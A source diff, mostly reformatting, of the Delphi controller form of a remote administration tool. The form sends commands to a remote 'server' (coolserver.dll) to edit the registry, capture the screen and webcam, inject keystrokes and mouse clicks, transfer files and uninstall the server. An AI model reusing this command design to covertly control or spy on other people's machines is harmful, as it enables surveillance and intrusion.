   if EditPathArchivos.Text[Length(EditPathArchivos.Text)] <> '\' then
     EditPathArchivos.Text := EditPathArchivos.Text + '\';
   Servidor.Connection.Writeln('LISTARARCHIVOS|' + EditPathArchivos.Text);
 end;
 
 //Obtiene la ruta completa del arbol padre\hijo\nieto\ xD
+
 function TFormControl.ObtenerRutaAbsolutaDeArbol(Nodo: TTreeNode): string;
 begin
   repeat
     Result := Nodo.Text + '\' + Result;
-    Nodo   := Nodo.Parent;
+    Nodo := Nodo.Parent;
   until not Assigned(Nodo);
 end;
 
@@ -2078,70 +2112,71 @@ procedure TFormControl.TreeViewRegeditChange(Sender: TObject; Node: TTreeNode);
 begin
 
   if not Servidor.Connection.Connected then
-  begin
-    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
-    Exit;
-  end;
+    begin
+      MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
+      Exit;
+    end;
 
   if TreeViewRegedit.Selected <> nil then
-  begin
-    EditPathRegistro.Text := ObtenerRutaAbsolutaDeArbol(TreeViewRegedit.Selected);
-    Servidor.Connection.Writeln('LISTARVALORES|' + EditPathRegistro.Text);
-    ListViewRegistro.enabled := false;
-    BtnVerRegisto.enabled := false;
-  end;
+    begin
+      EditPathRegistro.Text := ObtenerRutaAbsolutaDeArbol(TreeViewRegedit.Selected);
+      Servidor.Connection.Writeln('LISTARVALORES|' + EditPathRegistro.Text);
+      ListViewRegistro.Enabled := False;
+      BtnVerRegisto.Enabled := False;
+    end;
 end;
 
 procedure TFormControl.TreeViewRegeditDblClick(Sender: TObject);
 begin
   if not Servidor.Connection.Connected then
-  begin
-    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
-    Exit;
-  end;
-  TreeViewRegedit.enabled := false;
+    begin
+      MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
+      Exit;
+    end;
+  TreeViewRegedit.Enabled := False;
   Servidor.Connection.Writeln('LISTARCLAVES|' + EditPathRegistro.Text);
 end;
 
 //Lo hacemos en una función a parte para no saturar de código la función OnRead
+
 procedure TFormControl.AniadirClavesARegistro(Claves: string);
 var
-  Nodo:  TTreeNode;
+  Nodo: TTreeNode;
   Clave: string;
-  Total, Listadas : integer;
+  Total, Listadas: Integer;
   tmp: string;
 begin
   //Borramos los hijos que tenga, para no repetirnos en caso de pulsar dos veces
   //sobre una misma clave
   TreeViewRegedit.Items.beginupdate;
   TreeViewRegedit.Selected.DeleteChildren;
-  Claves := StringReplace(Claves,'|salto|', #10, [rfReplaceAll]);
-  Claves := StringReplace(Claves,'|salto2|', #13, [rfReplaceAll]);
+  Claves := StringReplace(Claves, '|salto|', #10, [rfReplaceAll]);
+  Claves := StringReplace(Claves, '|salto2|', #13, [rfReplaceAll]);
 
   tmp := claves;
   Total := 0;
-  while Pos('|', tmp) > 0 do  //Primero las contamos para poder mostrar en el panel cuantas hay
-  begin
-    Total := Total+1;
-    Delete(tmp, 1, Pos('|', tmp));
-  end;
+  while Pos('|', tmp) > 0 do //Primero las contamos para poder mostrar en el panel cuantas hay
+    begin
+      Total := Total + 1;
+      Delete(tmp, 1, Pos('|', tmp));
+    end;
   listadas := 0;
   while Pos('|', Claves) > 0 do
-  begin
-    Listadas := Listadas+1;
-    Estado(_('Listadas ')+inttostr(Listadas)+_(' claves de ')+inttostr(Total));
-    Clave := Copy(Claves, 1, Pos('|', Claves) - 1);
-    Nodo  := TreeViewRegedit.Items.AddChild(TreeViewRegedit.Selected, Clave);
-    //Sin seleccionar mostrar el icono de carpeta cerrada
-    Nodo.ImageIndex := 1;
-    //Seleccionado mostrar el icono de carpeta abierta
-    Nodo.SelectedIndex := 0;
-    Delete(Claves, 1, Pos('|', Claves));
-  end;
+    begin
+      Listadas := Listadas + 1;
+      Estado(_('Listadas ') + IntToStr(Listadas) + _(' claves de ') + IntToStr(Total));
+      Clave := Copy(Claves, 1, Pos('|', Claves) - 1);
+      Nodo := TreeViewRegedit.Items.AddChild(TreeViewRegedit.Selected, Clave);
+      //Sin seleccionar mostrar el icono de carpeta cerrada
+      Nodo.ImageIndex := 1;
+      //Seleccionado mostrar el icono de carpeta abierta
+      Nodo.SelectedIndex := 0;
+      Delete(Claves, 1, Pos('|', Claves));
+    end;
   TreeViewRegedit.Selected.Expand(False);
   TreeViewRegedit.Items.endupdate;
   Estado(_('Claves listadas'));
-  TreeViewRegedit.enabled := true;
+  TreeViewRegedit.Enabled := True;
 end;
 
 procedure TFormControl.AniadirValoresARegistro(Valores: string);
@@ -2150,46 +2185,46 @@ var
   Tipo: string;
 begin
   ListViewRegistro.Clear;
-  ListViewRegistro.items.beginupdate;
-  Valores := StringReplace(Valores,'|salto|', #10, [rfReplaceAll]);
-  Valores := StringReplace(Valores,'|salto2|', #13, [rfReplaceAll]);
+  ListViewRegistro.Items.beginupdate;
+  Valores := StringReplace(Valores, '|salto|', #10, [rfReplaceAll]);
+  Valores := StringReplace(Valores, '|salto2|', #13, [rfReplaceAll]);
 
   while Pos('|', Valores) > 0 do
-  begin
-    Item := ListViewRegistro.Items.Add;
-    //Nombre
-    Item.Caption := Copy(Valores, 1, Pos('|', Valores) - 1);
-    Delete(Valores, 1, Pos('|', Valores));
-    //Tipo
-    Tipo := Copy(Valores, 1, Pos('|', Valores) - 1);
+    begin
+      Item := ListViewRegistro.Items.Add;
+      //Nombre
+      Item.Caption := Copy(Valores, 1, Pos('|', Valores) - 1);
+      Delete(Valores, 1, Pos('|', Valores));
+      //Tipo
+      Tipo := Copy(Valores, 1, Pos('|', Valores) - 1);
 
-    if (Tipo = 'REG_BINARY') or (Tipo = 'REG_DWORD') then
-      Item.ImageIndex := 16
-    else
-      Item.ImageIndex := 15;
-    Item.SubItems.Add(Tipo);
-    Delete(Valores, 1, Pos('|', Valores));
-    //Datos
-    Item.SubItems.Add(Copy(Valores, 1, Pos('|', Valores) - 1));
-    Delete(Valores, 1, Pos('|', Valores));
-  end;
-  ListViewRegistro.items.endupdate;
-  ListViewRegistro.enabled := true;
-  ListViewRegistro.Width := ListViewRegistro.Width-1;//Para eliminar la scrollvar horizontal
-  ListViewRegistro.Width := ListViewRegistro.Width+1;
+      if (Tipo = 'REG_BINARY') or (Tipo = 'REG_DWORD') then
+        Item.ImageIndex := 16
+      else
+        Item.ImageIndex := 15;
+      Item.SubItems.Add(Tipo);
+      Delete(Valores, 1, Pos('|', Valores));
+      //Datos
+      Item.SubItems.Add(Copy(Valores, 1, Pos('|', Valores) - 1));
+      Delete(Valores, 1, Pos('|', Valores));
+    end;
+  ListViewRegistro.Items.endupdate;
+  ListViewRegistro.Enabled := True;
+  ListViewRegistro.Width := ListViewRegistro.Width - 1; //Para eliminar la scrollvar horizontal
+  ListViewRegistro.Width := ListViewRegistro.Width + 1;
 end;
 
 procedure TFormControl.BtnVerRegistoClick(Sender: TObject);
 begin
-  if EditPathRegistro.text = '' then exit;
-  if not BtnVerRegisto.enabled then exit;
-  BtnVerRegisto.enabled := false;
+  if EditPathRegistro.Text = '' then Exit;
+  if not BtnVerRegisto.Enabled then Exit;
+  BtnVerRegisto.Enabled := False;
   if Servidor.Connection.Connected then
-  begin
-    ListViewRegistro.enabled := false;
-    BtnVerRegisto.enabled := false;
-    Servidor.Connection.Writeln('LISTARVALORES|' + EditPathRegistro.Text);
-  end
+    begin
+      ListViewRegistro.Enabled := False;
+      BtnVerRegisto.Enabled := False;
+      Servidor.Connection.Writeln('LISTARVALORES|' + EditPathRegistro.Text);
+    end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
@@ -2197,28 +2232,29 @@ end;
 procedure TFormControl.N1Click(Sender: TObject);
 begin
   if Servidor.Connection.Connected then
-  begin
-    if PopupRegistro.PopupComponent.ClassType = TListView then
     begin
-      if ListViewRegistro.Selected <> nil then
-        //Pone el cursor para editar en el item
-        ListViewRegistro.Selected.EditCaption;
-    end;
-  end
+      if PopupRegistro.PopupComponent.ClassType = TListView then
+        begin
+          if ListViewRegistro.Selected <> nil then
+            //Pone el cursor para editar en el item
+            ListViewRegistro.Selected.EditCaption;
+        end;
+    end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 //Una vez editado el valor le avisamos al server
+
 procedure TFormControl.ListViewRegistroEdited(Sender: TObject;
   Item: TListItem; var S: string);
 begin
 
   if not Servidor.Connection.Connected then
-  begin
-    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
-    Exit;
-  end;
+    begin
+      MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
+      Exit;
+    end;
 
   Servidor.Connection.Writeln('NEWNOMBREVALOR|' + EditPathRegistro.Text +
     '|' + Item.Caption + '|' + S);
@@ -2227,19 +2263,18 @@ end;
 procedure TFormControl.Eliminar1Click(Sender: TObject);
 begin
   if Servidor.Connection.Connected then
-  begin
-    if PopupRegistro.PopupComponent.ClassType = TListView then
     begin
-      if MessageDlg(_('¿Está seguro de que quiere borrar el valor ') +
-        ListViewRegistro.Selected.Caption + '?', mtConfirmation, [mbYes, mbNo], 0) <> idNo then
-        Servidor.Connection.Writeln('BORRARREGISTRO|' + EditPathRegistro.Text +
-          ListViewRegistro.Selected.Caption);
+      if PopupRegistro.PopupComponent.ClassType = TListView then
+        begin
+          if MessageDlg(_('¿Está seguro de que quiere borrar el valor ') +
+            ListViewRegistro.Selected.Caption + '?', mtConfirmation, [mbYes, mbNo], 0) <> idNo then
+            Servidor.Connection.Writeln('BORRARREGISTRO|' + EditPathRegistro.Text +
+              ListViewRegistro.Selected.Caption);
+        end
+      else if MessageDlg(_('¿Está seguro de que quiere borrar la clave ') +
+        TreeViewRegedit.Selected.Text + '?', mtConfirmation, [mbYes, mbNo], 0) <> idNo then
+        Servidor.Connection.Writeln('BORRARREGISTRO|' + EditPathRegistro.Text);
     end
-    else
-    if MessageDlg(_('¿Está seguro de que quiere borrar la clave ') +
-      TreeViewRegedit.Selected.Text + '?', mtConfirmation, [mbYes, mbNo], 0) <> idNo then
-      Servidor.Connection.Writeln('BORRARREGISTRO|' + EditPathRegistro.Text);
-  end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
@@ -2249,10 +2284,10 @@ var
   NewRegistro: TFormReg;
 begin
   if Servidor.Connection.Connected then
-  begin
-    NewRegistro := TFormReg.Create(self, Servidor, EditPathRegistro.Text, 'REG_SZ');
-    NewRegistro.ShowModal;
-  end
+    begin
+      NewRegistro := TFormReg.Create(Self, Servidor, EditPathRegistro.Text, 'REG_SZ');
+      NewRegistro.ShowModal;
+    end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
@@ -2262,10 +2297,10 @@ var
   NewRegistro: TFormReg;
 begin
   if Servidor.Connection.Connected then
-  begin
-    NewRegistro := TFormReg.Create(self, Servidor, EditPathRegistro.Text, 'REG_BINARY');
-    NewRegistro.ShowModal;
-  end
+    begin
+      NewRegistro := TFormReg.Create(Self, Servidor, EditPathRegistro.Text, 'REG_BINARY');
+      NewRegistro.ShowModal;
+    end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
@@ -2275,10 +2310,10 @@ var
   NewRegistro: TFormReg;
 begin
   if Servidor.Connection.Connected then
-  begin
-    NewRegistro := TFormReg.Create(self, Servidor, EditPathRegistro.Text, 'REG_DWORD');
-    NewRegistro.ShowModal;
-  end
+    begin
+      NewRegistro := TFormReg.Create(Self, Servidor, EditPathRegistro.Text, 'REG_DWORD');
+      NewRegistro.ShowModal;
+    end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
@@ -2288,54 +2323,54 @@ var
   NewRegistro: TFormReg;
 begin
   if Servidor.Connection.Connected then
-  begin
-    NewRegistro := TFormReg.Create(self, Servidor, EditPathRegistro.Text,
-      'REG_MULTI_SZ');
-    NewRegistro.ShowModal;
-  end
+    begin
+      NewRegistro := TFormReg.Create(Self, Servidor, EditPathRegistro.Text,
+        'REG_MULTI_SZ');
+      NewRegistro.ShowModal;
+    end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 procedure TFormControl.TreeViewRegeditContextPopup(Sender: TObject;
-  MousePos: TPoint; var Handled: boolean);
+  MousePos: TPoint; var Handled: Boolean);
 begin
   //Para que al hacer click derecho sobre un item este pase a estar seleccionado
   if TreeViewRegedit.GetNodeAt(MousePos.X, MousePos.Y) <> nil then
-  begin
-    TreeViewRegedit.Selected := TreeViewRegedit.GetNodeAt(MousePos.X, MousePos.Y);
-    //Desactivamos algunas opciones del popupmenu que no podemos usar con las claves como modificar
-    PopupRegistro.Items[1].Enabled := False;
-    PopupRegistro.Items[2].Enabled := False;
-    //Activamos el resto
-    PopupRegistro.Items[3].Enabled := True;
-  end
+    begin
+      TreeViewRegedit.Selected := TreeViewRegedit.GetNodeAt(MousePos.X, MousePos.Y);
+      //Desactivamos algunas opciones del popupmenu que no podemos usar con las claves como modificar
+      PopupRegistro.Items[1].Enabled := False;
+      PopupRegistro.Items[2].Enabled := False;
+      //Activamos el resto
+      PopupRegistro.Items[3].Enabled := True;
+    end
   else //No se ha seleccionado item, así que solo mostramos el menu de nuevo
-  begin
-    PopupRegistro.Items[1].Enabled := False;
-    PopupRegistro.Items[2].Enabled := False;
-    PopupRegistro.Items[3].Enabled := False;
-  end;
+    begin
+      PopupRegistro.Items[1].Enabled := False;
+      PopupRegistro.Items[2].Enabled := False;
+      PopupRegistro.Items[3].Enabled := False;
+    end;
 end;
 
 procedure TFormControl.ListViewRegistroContextPopup(Sender: TObject;
-  MousePos: TPoint; var Handled: boolean);
+  MousePos: TPoint; var Handled: Boolean);
 begin
   //Se ha seleccionado un item
   if ListViewRegistro.Selected <> nil then
-  begin
-    //Habilitamos las opciones para trabajar con claves
-    PopupRegistro.Items[1].Enabled := True;
-    PopupRegistro.Items[2].Enabled := True;
-    PopupRegistro.Items[3].Enabled := True;
-  end
+    begin
+      //Habilitamos las opciones para trabajar con claves
+      PopupRegistro.Items[1].Enabled := True;
+      PopupRegistro.Items[2].Enabled := True;
+      PopupRegistro.Items[3].Enabled := True;
+    end
   else
-  begin
-    //No se ha seleccionado un item, solo mostramos el menu Nuevo
-    PopupRegistro.Items[1].Enabled := False;
-    PopupRegistro.Items[2].Enabled := False;
-    PopupRegistro.Items[3].Enabled := False;
-  end;
+    begin
+      //No se ha seleccionado un item, solo mostramos el menu Nuevo
+      PopupRegistro.Items[1].Enabled := False;
+      PopupRegistro.Items[2].Enabled := False;
+      PopupRegistro.Items[3].Enabled := False;
+    end;
 end;
 
 procedure TFormControl.Clave1Click(Sender: TObject);
@@ -2343,12 +2378,12 @@ var
   NewClave: string;
 begin
   if Servidor.Connection.Connected then
-  begin
-    NewClave := InputBox(_('Escriba el nombre para la nueva clave.'),
-      _('Crear nueva clave'), _('NuevaClave'));
-    if NewClave <> '' then
-      Servidor.Connection.Writeln('NEWCLAVE|' + EditPathRegistro.Text + '|' + NewClave);
-  end
+    begin
+      NewClave := InputBox(_('Escriba el nombre para la nueva clave.'),
+        _('Crear nueva clave'), _('NuevaClave'));
+      if NewClave <> '' then
+        Servidor.Connection.Writeln('NEWCLAVE|' + EditPathRegistro.Text + '|' + NewClave);
+    end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
@@ -2358,26 +2393,26 @@ var
   Tipo: string;
 begin
   if Servidor.Connection.Connected then
-  begin
-    if RdGrpBotonesMensaje.ItemIndex <> -1 then
     begin
-      if RdBtnError.Checked then
-        Tipo := 'WARN'
-      else if RdBtnPregunta.Checked then
-        Tipo := 'QUES'
-      else if RdBtnExclamacion.Checked then
-        Tipo := 'EXCL'
-      else if RdBtnInfo.Checked then
-        Tipo := 'INFO'
-      else if RdBtnVacio.Checked then
-        Tipo := 'VACI';
-      Servidor.Connection.Writeln('MSJN' + MemoMensaje.Text + '|' +
-        EditTituloMensaje.Text + '|' + Tipo + '|' +
-        PChar(IntToStr(RdGrpBotonesMensaje.ItemIndex)) + '|');
+      if RdGrpBotonesMensaje.ItemIndex <> -1 then
+        begin
+          if RdBtnError.Checked then
+            Tipo := 'WARN'
+          else if RdBtnPregunta.Checked then
+            Tipo := 'QUES'
+          else if RdBtnExclamacion.Checked then
+            Tipo := 'EXCL'
+          else if RdBtnInfo.Checked then
+            Tipo := 'INFO'
+          else if RdBtnVacio.Checked then
+            Tipo := 'VACI';
+          Servidor.Connection.Writeln('MSJN' + MemoMensaje.Text + '|' +
+            EditTituloMensaje.Text + '|' + Tipo + '|' +
+            PChar(IntToStr(RdGrpBotonesMensaje.ItemIndex)) + '|');
+        end
+      else
+        MessageDlg(_('Selecciona algún tipo de botón'), mtWarning, [mbOK], 0);
     end
-    else
-      MessageDlg(_('Selecciona algún tipo de botón'), mtWarning, [mbOK], 0);
-  end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
@@ -2389,22 +2424,21 @@ end;
 
 procedure TFormControl.BtnCapturarScreen1Click(Sender: TObject);
 begin
-  if not BtnCapturarScreen.enabled then exit;
+  if not BtnCapturarScreen.Enabled then Exit;
   if not Servidor.Connection.Connected then
-  begin
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
-    Exit;
-  end;
+    begin
+      MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+      Exit;
+    end;
 
-  BtnCapturarScreen.enabled := false;
-  if TimerCaptureScreen.enabled then
-    TimerCaptureScreen.enabled := not TimerCaptureScreen.enabled;  //Desactivamos el timer, será activado cuando recibamos la captura
+  BtnCapturarScreen.Enabled := False;
+  if TimerCaptureScreen.Enabled then
+    TimerCaptureScreen.Enabled := not TimerCaptureScreen.Enabled; //Desactivamos el timer, será activado cuando recibamos la captura
   if FormVisorCaptura = nil then
-    Servidor.Connection.Writeln('CAPSCREEN|' + IntToStr(TrackBarCalidad.Position)+'|'+inttostr(imgCaptura.Height)+'|')
+    Servidor.Connection.Writeln('CAPSCREEN|' + IntToStr(TrackBarCalidad.Position) + '|' + IntToStr(imgCaptura.Height) + '|')
   else
-    Servidor.Connection.Writeln('CAPSCREEN|' + IntToStr(TrackBarCalidad.Position)+'|'+inttostr((FormVisorCaptura as TScreenMax).imgcaptura.Height)+'|');
+    Servidor.Connection.Writeln('CAPSCREEN|' + IntToStr(TrackBarCalidad.Position) + '|' + IntToStr((FormVisorCaptura as TScreenMax).imgcaptura.Height) + '|');
 end;
-
 
 procedure TFormControl.Enviarteclas1Click(Sender: TObject);
 //Enviar teclas a una ventana....
@@ -2412,19 +2446,19 @@ var
   NewSendKeys: TFormSendKeys;
 begin
   if Servidor.Connection.Connected then
-  begin
-    if ListViewVentanas.Selected = nil then
     begin
-      MessageDlg(_('Selecciona alguna ventana para enviarle teclas.'),
-        mtWarning, [mbOK], 0);
+      if ListViewVentanas.Selected = nil then
+        begin
+          MessageDlg(_('Selecciona alguna ventana para enviarle teclas.'),
+            mtWarning, [mbOK], 0);
+        end
+      else
+        begin
+          NewSendKeys := TFormSendKeys.Create(Self, Servidor,
+            ListViewVentanas.Selected.SubItems[0], ListViewVentanas.Selected.Caption);
+          NewSendKeys.Show;
+        end;
     end
-    else
-    begin
-      NewSendKeys := TFormSendKeys.Create(self, Servidor,
-        ListViewVentanas.Selected.SubItems[0], ListViewVentanas.Selected.Caption);
-      NewSendKeys.Show;
-    end;
-  end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
@@ -2439,71 +2473,76 @@ procedure TFormControl.BtnObtenerWebcamsClick(Sender: TObject);
 begin
 
   if not Servidor.Connection.Connected then
-  begin
-    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
-    Exit;
-  end;
+    begin
+      MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
+      Exit;
+    end;
 
   Servidor.Connection.Writeln('LISTARWEBCAMS');
 end;
 
 procedure TFormControl.BtnCapturarWebcamClick(Sender: TObject);
 begin
-  if not BtnCapturarWebcam.enabled then exit;
+  if not BtnCapturarWebcam.Enabled then Exit;
 
   if not Servidor.Connection.Connected then
-  begin
-    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
-    Exit;
-  end;
+    begin
+      MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+      Exit;
+    end;
 
-  if(ComboBoxWebcam.Items.Count=0) or (ComboBoxWebcam.Items.Text = '') then Exit;
-  BtnCapturarWebcam.enabled := false;
-  //imgWebcam.Picture := nil; //Refrescamos// Genera un parpadeo
-  if TimerCamCapture.enabled then
-      TimerCamCapture.enabled := not TimerCamCapture.enabled;  //Desactivamos el timer, será activado cuando recibamos la captura
+  if (ComboBoxWebcam.Items.Count = 0) or (ComboBoxWebcam.Items.Text = '') then Exit;
+  BtnCapturarWebcam.Enabled := False;
+  if TimerCamCapture.Enabled then
+    TimerCamCapture.Enabled := not TimerCamCapture.Enabled; //Desactivamos el timer, será activado cuando recibamos la captura
   Servidor.Connection.Writeln('CAPTURAWEBCAM|' + IntToStr(ComboboxWebcam.ItemIndex) +
     '|' + IntToStr(TrackBarCalidadWebcam.Position));
 end;
 
 procedure TFormControl.EnviarClickM(Sender: TObject; Button: TMouseButton;
-  Shift: TShiftState; X, Y: integer);
+  Shift: TShiftState; X, Y: Integer);
 var
-  AltoCap, AnchoCap: integer;
+  AltoCap, AnchoCap: Integer;
 begin
 
   if not Servidor.Connection.Connected then
-  begin
-    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
-    exit;
-  end;
+    begin
+      MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
+      Exit;
+    end;
 
   if CheckBoxMouseClicks.Checked then
-  begin
-
-    if(anchurapantalla = 0) then //necesitamos el tamaño de la pantalla para calcular la posicion real.
     begin
-      MessageDlg(_('Pide una captura primero!'), mtWarning, [mbOK], 0);
-      exit;
+      if (anchurapantalla = 0) then //Necesitamos el tamaño de la pantalla para calcular la posicion real.
+        begin
+          MessageDlg(_('Pide una captura primero!'), mtWarning, [mbOK], 0);
+          Exit;
+        end;
+      AnchoCap := AnchuraPantalla;
+      AltoCap := AlturaPantalla;
+      X := (X * AnchoCap) div (imgCaptura.Width); //Una regla de tres
+      Y := (Y * AltoCap) div (imgCaptura.Height);
+      if button = mbLeft then
+        begin
+          //Señalar
+          Servidor.Connection.Writeln('MOUSEP' + IntToStr(X) + '|' + IntToStr(y) + '|' + 'CLICKIZQ' + '|');
+          //Hacer Click
+          Servidor.Connection.Writeln('MOUSEP' + IntToStr(X) + '|' + IntToStr(y) + '|' + 'CLICKIZQ' + '|');
+        end
+      else if button = mbRight then
+        begin
+          //Señalar
+          Servidor.Connection.Writeln('MOUSEP' + IntToStr(X) + '|' + IntToStr(y) + '|' + 'CLICKDER' + '|');
+          //Hacer Click
+          Servidor.Connection.Writeln('MOUSEP' + IntToStr(X) + '|' + IntToStr(y) + '|' + 'CLICKDER' + '|');
+        end;
     end;
-    
-    AnchoCap := AnchuraPantalla;
-    AltoCap := AlturaPantalla;
-    X := (X * AnchoCap) div (imgCaptura.Width); //Una regla de tres
-    Y := (Y * AltoCap) div (imgCaptura.Height);
-    if button = mbLeft then
-      Servidor.Connection.Writeln('MOUSEP' + IntToStr(X) + '|' +
-        IntToStr(y) + '|' + 'CLICKIZQ' + '|')
-    else if button = mbRight then
-      Servidor.Connection.Writeln('MOUSEP' + IntToStr(X) + '|' +
-        IntToStr(y) + '|' + 'CLICKDER' + '|');
-  end;
 end;
 
 procedure TFormControl.BtnActualizarServidorInfoClick(Sender: TObject);
 begin
-  if not BtnActualizarServidorInfo.enabled then exit;
-  BtnActualizarServidorInfo.enabled := false;
+  if not BtnActualizarServidorInfo.Enabled then Exit;
+  BtnActualizarServidorInfo.Enabled := False;
   if Servidor.connection.Connected then
     Servidor.connection.writeln('SERVIDOR|INFO|')
   else
@@ -2514,555 +2553,547 @@ procedure TFormControl.BtnEnviarComandoServidorClick(Sender: TObject);
 begin
 
   if not Servidor.Connection.Connected then
-  begin
-    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
-    exit;
-  end;
+    begin
+      MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
+      Exit;
+    end;
 
   if ComboBoxGestionDeServidor.Text = {_}('Cerrar') then
-  begin
-    if MessageBoxW(Handle,
-      Pwidechar(_('¿Está seguro de que desea cerrar el servidor? Este no se volverá a iniciar si no están activos los métodos de auto-inicio.')),
-      pwidechar(_('Confirmación')), Mb_YesNo + MB_IconAsterisk) = idYes then
-      Servidor.Connection.Writeln('SERVIDOR|CERRAR|');
-  end;
+    begin
+      if MessageBoxW(Handle,
+        Pwidechar(_('¿Está seguro de que desea cerrar el servidor? Este no se volverá a iniciar si no están activos los métodos de auto-inicio.')),
+        pwidechar(_('Confirmación')), Mb_YesNo + MB_IconAsterisk) = idYes then
+        Servidor.Connection.Writeln('SERVIDOR|CERRAR|');
+    end;
   if ComboBoxGestionDeServidor.Text = {_}('Desinstalar') then
-  begin
-    if MessageBoxW(Handle,
-      Pwidechar(_('¿Está seguro de que desea desinstalar el servidor? ¡Este será removido completamente del equipo!')),
-      Pwidechar(_('Confirmación')), Mb_YesNo + MB_IconAsterisk) = idYes then
-      Servidor.Connection.Writeln('SERVIDOR|DESINSTALAR|');
-  end;
+    begin
+      if MessageBoxW(Handle,
+        Pwidechar(_('¿Está seguro de que desea desinstalar el servidor? ¡Este será removido completamente del equipo!')),
+        Pwidechar(_('Confirmación')), Mb_YesNo + MB_IconAsterisk) = idYes then
+        Servidor.Connection.Writeln('SERVIDOR|DESINSTALAR|');
+    end;
   if ComboBoxGestionDeServidor.Text = {_}('Actualizar') then
-  begin
-    if MessageBoxW(Handle,
-      Pwidechar(_('¿Está seguro de que desea actualizar el servidor? ¡Se volverá a enviar coolserver.dll!')),
-      Pwidechar(_('Confirmación')), Mb_YesNo + MB_IconAsterisk) = idYes then
-      Servidor.Connection.Writeln('SERVIDOR|ACTUALIZAR|');
-  end;
+    begin
+      if MessageBoxW(Handle,
+        Pwidechar(_('¿Está seguro de que desea actualizar el servidor? ¡Se volverá a enviar coolserver.dll!')),
+        Pwidechar(_('Confirmación')), Mb_YesNo + MB_IconAsterisk) = idYes then
+        Servidor.Connection.Writeln('SERVIDOR|ACTUALIZAR|');
+    end;
 end;
 
 procedure TFormControl.BtnVerGrandeCapClick(Sender: TObject);
 begin
   if FormVisorCaptura = nil then
-    FormVisorCaptura := TScreenMax.Create(self, ImgCaptura.Picture, Servidor,Tobject(self));
+    FormVisorCaptura := TScreenMax.Create(Self, ImgCaptura.Picture, Servidor, TObject(Self));
   (FormVisorCaptura as TScreenMax).show;
 end;
-
 
 procedure TFormControl.TimerCaptureScreenTimer(Sender: TObject);
 begin
   if not Servidor.Connection.Connected then
-  begin
-    self.TimerCaptureScreen.Enabled := False;
-    exit;
-  end;
-  BtnCapturarScreen.click;
+    begin
+      Self.TimerCaptureScreen.Enabled := False;
+      Exit;
+    end;
+  BtnCapturarScreen.Click;
 end;
-
 
 //El popup de Descargar fichero añade el archivo al ListView de descargas, lo encola
+
 procedure TFormControl.Descargarfichero1Click(Sender: TObject);
 var
-  FilePath: ansistring;
+  FilePath: AnsiString;
 begin
   if not Servidor.Connection.Connected then
-  begin
-    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
-    exit;
-  end;
-if PageControlArchivos.ActivePage = TabSheetVerArchivos then
-  mslistviewitem := ListViewArchivos.Selected
-else
-  mslistviewitem := ListViewBuscar.Selected;
-
-while Assigned(mslistviewitem) do
-begin
+    begin
+      MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
+      Exit;
+    end;
   if PageControlArchivos.ActivePage = TabSheetVerArchivos then
-    FilePath := Trim(EditPathArchivos.Text) + mslistviewitem.Caption
+    mslistviewitem := ListViewArchivos.Selected
   else
-    FilePath := Trim(mslistviewitem.subitems[0]);
+    mslistviewitem := ListViewBuscar.Selected;
 
-  if (mslistviewitem.ImageIndex = 3) then
-  begin
-    PageControlArchivos.activepage := TabSheetTransferencias;
-    Servidor.Connection.Writeln('GETFOLDER|' + FilePath+'\');
-  end
-  else
-      agregardescarga(FilePath);
-  if PageControlArchivos.ActivePage = TabSheetVerArchivos then
-    mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected])
-  else
-    mslistviewitem := ListViewBuscar.GetNextItem(mslistviewitem, sdAll, [isSelected])
-end;
+  while Assigned(mslistviewitem) do
+    begin
+      if PageControlArchivos.ActivePage = TabSheetVerArchivos then
+        FilePath := Trim(EditPathArchivos.Text) + mslistviewitem.Caption
+      else
+        FilePath := Trim(mslistviewitem.subitems[0]);
 
-
-
-
+      if (mslistviewitem.ImageIndex = 3) then
+        begin
+          PageControlArchivos.ActivePage := TabSheetTransferencias;
+          Servidor.Connection.Writeln('GETFOLDER|' + FilePath + '\');
+        end
+      else
+        agregardescarga(FilePath);
+      if PageControlArchivos.ActivePage = TabSheetVerArchivos then
+        mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected])
+      else
+        mslistviewitem := ListViewBuscar.GetNextItem(mslistviewitem, sdAll, [isSelected])
+    end;
 
 end;
 
 //El popup de Subir fichero añade el archivo al ListView de descargas, lo encola
+
 procedure TFormControl.Subirfichero1Click(Sender: TObject);
 var
-  i: integer;
+  i: Integer;
   Descarga: TDescargaHandler;
-  FilePath: ansistring;
+  FilePath: AnsiString;
 begin
   if not Servidor.Connection.Connected then
-  begin
-    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
-    exit;
-  end;
+    begin
+      MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
+      Exit;
+    end;
